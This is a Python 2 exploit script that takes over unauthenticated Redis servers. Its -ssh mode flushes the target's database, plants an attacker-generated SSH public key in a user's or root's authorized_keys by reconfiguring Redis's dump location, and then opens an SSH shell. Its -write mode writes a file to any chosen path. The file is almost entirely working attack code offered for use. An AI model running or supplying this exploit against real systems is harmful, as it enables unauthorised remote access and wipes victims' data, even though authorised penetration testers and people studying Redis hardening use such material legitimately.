#!/usr/bin/python
# This code exploits unauthenticated redis servers

# http://antirez.com/news/96
# https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419
# https://github.com/Avinash-acid/Redis-Server-Exploit
# Dunstan Pinto, 26/9/2018 (dunstan.pinto@gmail.com)



import os
from sys import argv
from termcolor import colored
import ntpath


PATH='/usr/bin/redis-cli'
PATH1='/usr/local/bin/redis-cli'


def redis_ssh(ip_address,port,switch,user):
	if os.path.isfile(PATH) or os.path.isfile(PATH1):
		try:
			print colored("SSH Keys Need to be Generated", 'green')
			os.system('ssh-keygen -t rsa -C {0} -f id_rsa'.format(user))
			print colored("Keys Generated Successfully", "blue")
			os.system("(echo \'\r\n\'; cat id_rsa.pub; echo  \'\r\n\') > public_key.txt")
			cmd = 'redis-cli -h ' + ip_address + ' -p ' + port + ' flushall'

			cmd1 = 'redis-cli -h ' + ip_address + ' -p ' + port
			os.system(cmd)
			cmd2 = "cat public_key.txt | redis-cli -h  {0} -p {1} -x set s-key".format(ip_address,port)
			os.system(cmd2)
			cmd3 = cmd1 + ' config set dbfilename "backup.db" '
			if user!="root":
				cmd4 = cmd1 + ' config set dir /home/{0}/.ssh/'.format(user)
			else:
				cmd4 = cmd1 + ' config set dir /root/.ssh/'
			cmd5 = cmd1 + ' config set dbfilename authorized_keys '
			cmd6 = cmd1 + ' save'
			os.system(cmd3)
			print colored("Trying to change dir to .ssh under the user's home directory", "green")
			os.system(cmd4)
			print colored("Saving our generated public key in the 'authorized_keys' file", "green")
			os.system(cmd5)
			os.system(cmd6)
			print colored("Connecting to the target server using SSH public key authentication. If all works, you should get a shell!", "green")
			shell = "ssh -i id_rsa {0}@{1}".format(user,ip_address)
			os.system(shell)
			os.system("rm id_rsa id_rsa.pub public_key.txt")
		except:
			print colored("Something went wrong!", "red")
	else:
		print colored("Redis-cli is not present on your system. You need to install it to proceed further.", "red")

def redis_write(ip_address,port,switch,path):
	if os.path.isfile(PATH) or os.path.isfile(PATH1):
		try:
			os.system("echo 'This is a test file to demonstrate unauthenticated write access using redis' > temp.txt")
			cmd = 'redis-cli -h ' + ip_address + ' -p ' + port + ' flushall'

			cmd1 = 'redis-cli -h ' + ip_address + ' -p ' + port
			os.system(cmd)
			cmd2 = "cat temp.txt | redis-cli -h  {0} -p {1} -x set s-key".format(ip_address,port)
			os.system(cmd2)
			cmd3 = cmd1 + ' config set dbfilename "backup.db" '
			head, tail = ntpath.split(path)
			cmd4 = cmd1 + ' config set dir {0}'.format(head)
			cmd5 = cmd1 + ' config set dbfilename {0} '.format(tail)
			cmd6 = cmd1 + ' save'
			os.system(cmd3)
			print colored("Trying to write to a file at path {0}".format(path), "green")
			os.system(cmd4)
			os.system(cmd5)
			os.system(cmd6)
			print colored("File written to path {0}. Ask the project team to confirm".format(path), "green")
			os.system("rm temp.txt")
		except:
			print colored("Something went wrong!", "red")
	else:
		print colored("Redis-cli is not present on your system. You need to install it to proceed further.", "red")

if __name__=="__main__":
	try:
		ip_address = argv[1]
		port = argv[2]
		switch = argv[3]
		if switch == '-ssh':
			try:    	    	
				user = argv[4]
				print 'Exploiting redis to get a shell using ssh'
				redis_ssh(ip_address,port,switch,user)
			except IndexError:
				print 'Usage: python redis.py <RHOST> <PORT> -ssh <user>'
		elif switch == '-write':
			try:
				path = argv[4]
				print 'Exploiting redis to write to a file at '+argv[4]
				redis_write(ip_address,port,switch,path)
			except IndexError:
				print "Usage: python redis.py <RHOST> <PORT> -write <path>"
	except IndexError:
		print "Use the -shell switch to exploit redis to get a shell using ssh, for e.g.: python redis.py <RHOST> <PORT> -ssh <user>"
		print "Use the -write switch to exploit redis to write to a file, for e.g.: python redis.py <RHOST> <PORT> -write <path>"
